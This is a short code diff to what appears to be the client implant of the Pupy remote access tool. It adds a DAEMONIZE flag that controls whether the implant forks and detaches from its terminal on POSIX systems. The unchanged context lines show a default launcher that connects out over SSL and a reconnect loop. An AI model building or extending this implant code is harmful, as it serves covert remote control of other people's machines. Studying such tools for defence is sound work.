@@ -54,6 +54,7 @@ if sys.platform=="win32" and hasattr(sys, 'frozen') and sys.frozen:
 else:
     logging.getLogger().setLevel(logging.ERROR)
 
+DAEMONIZE=False
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
 
@@ -147,6 +148,7 @@ attempt=0
 def main():
     global LAUNCHER
     global LAUNCHER_ARGS
+    global DAEMONIZE
     global attempt
 
     if len(sys.argv)>1:
@@ -191,6 +193,10 @@ def main():
             pupy.infos['launcher_args']=LAUNCHER_ARGS
             pupy.infos['launcher_inst']=launcher
             pupy.infos['transport']=launcher.get_transport()
+            if os.name == 'posix':
+                pupy.infos['daemonize']=DAEMONIZE
+            else:
+                pupy.infos['daemonize']='Default'
             rpyc_loop(launcher)
         finally:
             time.sleep(get_next_wait(attempt))
@@ -250,7 +256,7 @@ def rpyc_loop(launcher):
         return
 
 if __name__=="__main__":
-    if 'linux' in sys.platform:
+    if os.name == 'posix' and DAEMONIZE:
         if os.fork():   # launch child and...
             os._exit(0) # kill off parent
         os.setsid()
